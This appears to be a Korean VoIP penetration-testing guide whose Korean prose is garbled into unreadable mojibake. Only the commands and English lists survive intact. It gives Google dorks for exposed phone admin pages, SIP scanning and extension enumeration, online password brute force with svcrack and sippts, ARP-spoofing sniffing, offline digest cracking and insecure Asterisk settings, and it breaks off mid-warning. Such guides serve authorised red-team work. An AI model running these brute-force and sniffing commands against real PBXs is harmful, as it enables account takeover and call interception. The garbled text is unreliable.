# VoIP ê¸°ë³¸ ì •ë³´

VoIPê°€ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë°°ìš°ë ¤ë©´ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## ê¸°ë³¸ ë©”ì‹œì§€
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## ì‘ë‹µ ì½”ë“œ

**1xxâ€”ì„ì‹œ ì‘ë‹µ**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”ì„±ê³µì ì¸ ì‘ë‹µ**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”ë¦¬ë‹¤ì´ë ‰ì…˜ ì‘ë‹µ**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”í´ë¼ì´ì–¸íŠ¸ ì‹¤íŒ¨ ì‘ë‹µ**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”ì„œë²„ ì˜¤ë¥˜ ì‘ë‹µ**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”ì „ì—­ ì‹¤íŒ¨ ì‘ë‹µ**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP ì—´ê±°

### ì „í™” ë²ˆí˜¸

ë ˆë“œíŒ€ì´ í•  ìˆ˜ ìˆëŠ” ì²« ë²ˆì§¸ ë‹¨ê³„ ì¤‘ í•˜ë‚˜ëŠ” OSINT ë„êµ¬, Google ê²€ìƒ‰ ë˜ëŠ” ì›¹ í˜ì´ì§€ë¥¼ ìŠ¤í¬ë˜í•‘í•˜ì—¬ íšŒì‚¬ì™€ ì—°ë½í•  ìˆ˜ ìˆëŠ” ì „í™” ë²ˆí˜¸ë¥¼ ì°¾ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì „í™” ë²ˆí˜¸ë¥¼ í™•ë³´í•œ í›„ ì˜¨ë¼ì¸ ì„œë¹„ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš´ì˜ìë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ìš´ì˜ìê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ íŒŒì•…í•˜ì—¬ íšŒì‚¬ê°€ VoIPë¥¼ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤... ê²Œë‹¤ê°€, íšŒì‚¬ê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ê³ ìš©í•˜ì§€ ì•Šì•˜ì§€ë§Œ PSTN ì¹´ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ìì²´ VoIP PBXë¥¼ ì „í†µ ì „í™”ë§ì— ì—°ê²°í•˜ëŠ” ê²½ìš°ë„ ìˆìŠµë‹ˆë‹¤.

ìŒì•…ì´ë‚˜ ìë™ ì‘ë‹µê³¼ ê°™ì€ ê²ƒë“¤ì€ ë³´í†µ VoIPê°€ ì‚¬ìš© ì¤‘ì„ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT ì •ë³´

VoIP ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” ë‹¤ë¥¸ OSINT ì—´ê±°ëŠ” ë ˆë“œíŒ€ì— ë„ì›€ì´ ë  ê²ƒì…ë‹ˆë‹¤.

### ë„¤íŠ¸ì›Œí¬ ì—´ê±°

- **`nmap`**ì€ UDP ì„œë¹„ìŠ¤ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆì§€ë§Œ, ìŠ¤ìº”ë˜ëŠ” UDP ì„œë¹„ìŠ¤ì˜ ìˆ˜ê°€ ë§ê¸° ë•Œë¬¸ì— ì´ëŸ¬í•œ ìœ í˜•ì˜ ì„œë¹„ìŠ¤ì—ì„œëŠ” ë§¤ìš° ëŠë¦¬ê³  ì •í™•í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPViciousì—ì„œ (`sudo apt install sipvicious`): ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ì—ì„œ SIP ì„œë¹„ìŠ¤ë¥¼ ì°¾ìŠµë‹ˆë‹¤.
* `svmap`ì€ User-Agent `friendly-scanner`ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— **ì°¨ë‹¨í•˜ê¸° ì‰½ìŠµë‹ˆë‹¤**, ê·¸ëŸ¬ë‚˜ `/usr/share/sipvicious/sipvicious`ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ì—¬ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS ìŠ¤ìº”ì€ UDP, TCP ë˜ëŠ” TLSë¥¼ í†µí•´ SIP ì„œë¹„ìŠ¤ë¥¼ ë§¤ìš° ë¹ ë¥´ê²Œ ìŠ¤ìº”í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ë©€í‹°ìŠ¤ë ˆë“œë¥¼ ì‚¬ìš©í•˜ë©° ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë²”ìœ„ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í¬íŠ¸ ë²”ìœ„ë¥¼ ì‰½ê²Œ ì§€ì •í•˜ê³  TCP ë° UDPë¥¼ ëª¨ë‘ ìŠ¤ìº”í•˜ë©° ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê¸°ë³¸ì ìœ¼ë¡œ OPTIONSë¥¼ ì‚¬ìš©) ê·¸ë¦¬ê³  ë‹¤ë¥¸ User-Agentë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê·¸ë¦¬ê³  ë” ë§ì€ ê¸°ëŠ¥).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:  

ë©”íƒ€ìŠ¤í”Œë¡œì‡:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### ì¶”ê°€ ë„¤íŠ¸ì›Œí¬ ì—´ê±°

PBXëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

- **69/UDP (TFTP)**: íŒì›¨ì–´ ì—…ë°ì´íŠ¸
- **80 (HTTP) / 443 (HTTPS)**: ì›¹ì—ì„œ ì¥ì¹˜ ê´€ë¦¬
- **389 (LDAP)**: ì‚¬ìš©ì ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” ëŒ€ì²´ ìˆ˜ë‹¨
- **3306 (MySQL)**: MySQL ë°ì´í„°ë² ì´ìŠ¤
- **5038 (Manager)**: ë‹¤ë¥¸ í”Œë«í¼ì—ì„œ Asterisk ì‚¬ìš© ê°€ëŠ¥
- **5222 (XMPP)**: Jabberë¥¼ ì‚¬ìš©í•œ ë©”ì‹œì§€
- **5432 (PostgreSQL)**: PostgreSQL ë°ì´í„°ë² ì´ìŠ¤
- ê·¸ ì™¸...

### ë°©ë²• ì—´ê±°

`SIPPTS enumerate`ë¥¼ ì‚¬ìš©í•˜ì—¬ PBXì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” **ì–´ë–¤ ë°©ë²•ì´ ìˆëŠ”ì§€** ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. [**sippts**](https://github.com/Pepelux/sippts)ì—ì„œ ì‚¬ìš©í•©ë‹ˆë‹¤.
```bash
sippts enumerate -i 10.10.0.10
```
### ì„œë²„ ì‘ë‹µ ë¶„ì„

ìš°ë¦¬ì—ê²Œ ë‹¤ì‹œ ë³´ë‚´ëŠ” ì„œë²„ì˜ í—¤ë”ë¥¼ ë¶„ì„í•˜ëŠ” ê²ƒì€ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤. ìš°ë¦¬ê°€ ë³´ë‚´ëŠ” ë©”ì‹œì§€ì˜ ìœ í˜• ë° í—¤ë”ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤. [**sippts**](https://github.com/Pepelux/sippts)ì˜ `SIPPTS send`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  í—¤ë”ë¥¼ ì¡°ì‘í•˜ê³  ì‘ë‹µì„ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
ë˜í•œ ì„œë²„ê°€ ì›¹ì†Œì¼“ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ë°ì´í„°ë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. [**sippts**](https://github.com/Pepelux/sippts)ì˜ `SIPPTS wssend`ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°œì¸í™”ëœ WS ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX(ì‚¬ì„¤ ë¶„ê¸° êµí™˜) ì‹œìŠ¤í…œì˜ ë‚´ì„ (Extensions)ì€ ì¡°ì§ì´ë‚˜ ê¸°ì—… ë‚´ì—ì„œ ê°œë³„ ì „í™” ë¼ì¸, ì¥ì¹˜ ë˜ëŠ” ì‚¬ìš©ìì— í• ë‹¹ëœ **ê³ ìœ í•œ ë‚´ë¶€ ì‹ë³„ì**ë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. ë‚´ì„ ì„ ì‚¬ìš©í•˜ë©´ ê° ì‚¬ìš©ìë‚˜ ì¥ì¹˜ì— ëŒ€í•´ ê°œë³„ ì™¸ë¶€ ì „í™” ë²ˆí˜¸ê°€ í•„ìš”í•˜ì§€ ì•Šê³ ë„ **ì¡°ì§ ë‚´ì—ì„œ í†µí™”ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ë¼ìš°íŒ…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`ì€ ë¬´ë£Œ SIP PBX ë‚´ì„  ë¼ì¸ ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ê°œë…ì ìœ¼ë¡œëŠ” **ë‚´ì„  ë²”ìœ„ë¥¼ ì¶”ì¸¡í•˜ê±°ë‚˜ ì£¼ì–´ì§„ ë‚´ì„  ëª©ë¡ì„ ì¶”ì¸¡**í•¨ìœ¼ë¡œì¨ ì „í†µì ì¸ ì›Œë‹¤ì´ì–¼ëŸ¬ì™€ ìœ ì‚¬í•˜ê²Œ ì‘ë™í•©ë‹ˆë‹¤.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS extenì€ SIP ì„œë²„ì˜ ë‚´ì„ ì„ ì‹ë³„í•©ë‹ˆë‹¤. Sipextenì€ ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë° í¬íŠ¸ ë²”ìœ„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: ë©”íƒ€ìŠ¤í”Œë¡œì‡ì„ ì‚¬ìš©í•˜ì—¬ í™•ì¥ì/ì‚¬ìš©ì ì´ë¦„ì„ ì—´ëŒí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**ëŠ” Inter Asterisk Exchange í”„ë¡œí† ì½œ **ì‚¬ìš©ìëª… ë¸Œë£¨íŠ¸ í¬ìŠ¤ ì—´ê±°ê¸°**ì…ë‹ˆë‹¤. enumIAXëŠ” ë‘ ê°€ì§€ ë‹¤ë¥¸ ëª¨ë“œì—ì„œ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤; ìˆœì°¨ì  ì‚¬ìš©ìëª… ì¶”ì¸¡ ë˜ëŠ” ì‚¬ì „ ê³µê²©.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP ê³µê²©

### ë¹„ë°€ë²ˆí˜¸ ë¸Œë£¨íŠ¸ í¬ìŠ¤ - ì˜¨ë¼ì¸

**PBX** ë° ì¼ë¶€ **ë‚´ì„ /ì‚¬ìš©ì ì´ë¦„**ì„ ë°œê²¬í•œ í›„ ë ˆë“œíŒ€ì€ ì¼ë°˜ì ì¸ ë¹„ë°€ë²ˆí˜¸ ì‚¬ì „ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ê¸° ìœ„í•´ **`REGISTER` ë©”ì†Œë“œë¥¼ í†µí•´ ë‚´ì„ ì— ì¸ì¦ì„ ì‹œë„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ì‚¬ìš©ì ì´ë¦„**ì´ ë‚´ì„ ê³¼ ë™ì¼í•  ìˆ˜ ìˆì§€ë§Œ, ì´ëŠ” PBX ì‹œìŠ¤í…œ, êµ¬ì„± ë° ì¡°ì§ì˜ ê¸°ë³¸ ì„¤ì •ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤...

ì‚¬ìš©ì ì´ë¦„ì´ ë‚´ì„ ê³¼ ë™ì¼í•˜ì§€ ì•Šì€ ê²½ìš° **ì‚¬ìš©ì ì´ë¦„ì„ ì•Œì•„ë‚´ì–´ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•´ì•¼** í•©ë‹ˆë‹¤.
{% endhint %}

* SIPViciousì˜ **`svcrack`** (`sudo apt install sipvicious`) : SVCrackë¥¼ ì‚¬ìš©í•˜ë©´ PBXì—ì„œ íŠ¹ì • ì‚¬ìš©ì ì´ë¦„/ë‚´ì„ ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ëš«ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrackì€ SIP ì„œë¹„ìŠ¤ë¥¼ ìœ„í•œ ì›ê²© ì•”í˜¸ í¬ë˜ì»¤ì…ë‹ˆë‹¤. RcrackëŠ” ë‹¤ì–‘í•œ IP ë° í¬íŠ¸ ë²”ìœ„ì—ì„œ ì—¬ëŸ¬ ì‚¬ìš©ìì˜ ì•”í˜¸ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP ìŠ¤ë‹ˆí•‘

ë§Œì•½ **ì˜¤í”ˆ ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬** ë‚´ì—ì„œ VoIP ì¥ë¹„ë¥¼ ë°œê²¬í•œë‹¤ë©´, **ëª¨ë“  ì •ë³´ë¥¼ ìŠ¤ë‹ˆí•‘**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€, ë” **íì‡„ì ì¸ ë„¤íŠ¸ì›Œí¬(ì´ë”ë„·ìœ¼ë¡œ ì—°ê²°ë˜ê±°ë‚˜ ë³´í˜¸ëœ ì™€ì´íŒŒì´ì— ì—°ê²°ëœ ê²½ìš°)** ë‚´ì— ìˆë‹¤ë©´ **ARPìŠ¤í‘¸í•‘**ê³¼ ê°™ì€ **MitM ê³µê²©**ì„ ìˆ˜í–‰í•˜ì—¬ **PBXì™€ ê²Œì´íŠ¸ì›¨ì´ ì‚¬ì´**ì—ì„œ ì •ë³´ë¥¼ ìŠ¤ë‹ˆí•‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë„¤íŠ¸ì›Œí¬ ì •ë³´ ì¤‘ì—ì„œëŠ” ì¥ë¹„ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•œ **ì›¹ ìê²© ì¦ëª…**, ì‚¬ìš©ì **ë‚´ì„ ë²ˆí˜¸**, **ì‚¬ìš©ìëª…**, **IP** ì£¼ì†Œ, ì‹¬ì§€ì–´ **í•´ì‹œëœ ë¹„ë°€ë²ˆí˜¸** ë° **ëŒ€í™”ë¥¼ ë“£ê¸° ìœ„í•´ ì¬í˜„í•  ìˆ˜ ìˆëŠ” RTP íŒ¨í‚·** ë“±ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì •ë³´ë¥¼ ì–»ê¸° ìœ„í•´ Wireshark, tcpdumpì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, **VoIP ëŒ€í™”ë¥¼ ìŠ¤ë‹ˆí•‘í•˜ëŠ” ë° íŠ¹ë³„íˆ ë§Œë“¤ì–´ì§„ ë„êµ¬ì¸** [**ucsniff**](https://github.com/Seabreg/ucsniff)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**SIP í†µì‹ ì—ì„œ TLSê°€ ì‚¬ìš©ëœ ê²½ìš°** SIP í†µì‹ ì„ ì•Œì•„ë³¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.\
**SRTP** ë° **ZRTP**ê°€ ì‚¬ìš©ëœ ê²½ìš°ë„ **RTP íŒ¨í‚·ì´ í‰ë¬¸ìœ¼ë¡œ í‘œì‹œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
{% endhint %}

#### SIP ìê²© ì¦ëª… (ë¹„ë°€ë²ˆí˜¸ ë¸Œë£¨íŠ¸í¬ìŠ¤ - ì˜¤í”„ë¼ì¸)

**SIP REGISTER í†µì‹ **ì„ ë” ì˜ ì´í•´í•˜ê¸° ìœ„í•´ [ì´ ì˜ˆì œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) **ì „ì†¡ë˜ëŠ” ìê²© ì¦ëª…**ì„ ì•Œì•„ë³´ê¸° ìœ„í•´.

* **`sipdump`** ë° **`sipcrack`,** **sipcrack**ì˜ ì¼ë¶€ (`apt-get install sipcrack`): ì´ëŸ¬í•œ ë„êµ¬ëŠ” SIP í”„ë¡œí† ì½œ ë‚´ì—ì„œ **ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦**ì„ **ì¶”ì¶œ**í•˜ê³  **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•  ìˆ˜ ìˆëŠ” **pcap**ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS ë¤í”„`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS ë¤í”„ëŠ” pcap íŒŒì¼ì—ì„œ ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦ì„ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrackì€ SIPPTS ë¤í”„ë¡œ ì–»ì€ ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦ì„ í¬ë™í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ ì œê³µí•˜ëŠ” ë„êµ¬**ì…ë‹ˆë‹¤:** SIPPTS tsharkëŠ” PCAP íŒŒì¼ì—ì„œ SIP í”„ë¡œí† ì½œì˜ ë°ì´í„°ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF ì½”ë“œ

ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì—ì„œëŠ” SIP ìê²© ì¦ëª… ë¿ë§Œ ì•„ë‹ˆë¼ **ìŒì„± ì‚¬ì„œí•¨**ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” DTMF ì½”ë“œë„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì½”ë“œë¥¼ **INFO SIP ë©”ì‹œì§€**, **ì˜¤ë””ì˜¤** ë˜ëŠ” **RTP íŒ¨í‚·** ë‚´ì— ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. RTP íŒ¨í‚· ë‚´ì— ì½”ë“œê°€ í¬í•¨ë˜ì–´ ìˆëŠ” ê²½ìš° ëŒ€í™”ì˜ í•´ë‹¹ ë¶€ë¶„ì„ ì˜ë¼ë‚´ì–´ ë„êµ¬ multimoë¥¼ ì‚¬ìš©í•˜ì—¬ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
multimon -a DTMF -t wac pin.wav
```
### ë¬´ë£Œ í†µí™” / Asterisks ì—°ê²° êµ¬ì„± ì˜¤ë¥˜

Asteriskì—ì„œëŠ” **íŠ¹ì • IP ì£¼ì†Œ** ë˜ëŠ” **ëª¨ë“  IP ì£¼ì†Œ**ë¡œë¶€í„°ì˜ ì—°ê²°ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
host=10.10.10.10
host=dynamic
```
ë§Œì•½ IP ì£¼ì†Œê°€ ì§€ì •ëœë‹¤ë©´, í˜¸ìŠ¤íŠ¸ëŠ” ì£¼ê¸°ì ìœ¼ë¡œ REGISTER ìš”ì²­ì„ ë³´ë‚¼ í•„ìš”ê°€ ì—†ì„ ê²ƒì…ë‹ˆë‹¤ (REGISTER íŒ¨í‚·ì—ëŠ” ì¼ë°˜ì ìœ¼ë¡œ 30ë¶„ì¸ TTLì´ í¬í•¨ë˜ì–´ ìˆìœ¼ë©°, ë‹¤ë¥¸ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì „í™”ê¸°ê°€ 30ë¶„ë§ˆë‹¤ REGISTERí•´ì•¼ í•©ë‹ˆë‹¤). ê·¸ëŸ¬ë‚˜ VoIP ì„œë²„ë¡œë¶€í„°ì˜ í†µí™”ë¥¼ ë°›ê¸° ìœ„í•´ ì—°ê²°ì„ í—ˆìš©í•˜ëŠ” ì—´ë¦° í¬íŠ¸ê°€ í•„ìš”í•  ê²ƒì…ë‹ˆë‹¤.

ì‚¬ìš©ìë¥¼ ì •ì˜í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **`type=user`**: ì‚¬ìš©ìëŠ” ì‚¬ìš©ìë¡œì¨ í†µí™”ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **`type=friend`**: í”¼ì–´ë¡œ í†µí™”ë¥¼ ìˆ˜í–‰í•˜ê³  ì‚¬ìš©ìë¡œì¨ í†µí™”ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í™•ì¥ê³¼ í•¨ê»˜ ì‚¬ìš©ë¨)
- **`type=peer`**: SIP íŠ¸ë í¬ë¡œì¨ í†µí™”ë¥¼ ë³´ë‚´ê³  ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ë³´ì•ˆì´ ì·¨ì•½í•œ ë³€ìˆ˜ë¥¼ í†µí•´ ì‹ ë¢°ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- **`insecure=port`**: IPë¡œ ì¸ì¦ëœ í”¼ì–´ ì—°ê²°ì„ í—ˆìš©í•©ë‹ˆë‹¤.
- **`insecure=invite`**: INVITE ë©”ì‹œì§€ì— ëŒ€í•œ ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
- **`insecure=port,invite`**: ë‘˜ ë‹¤

{% hint style="warning" %}
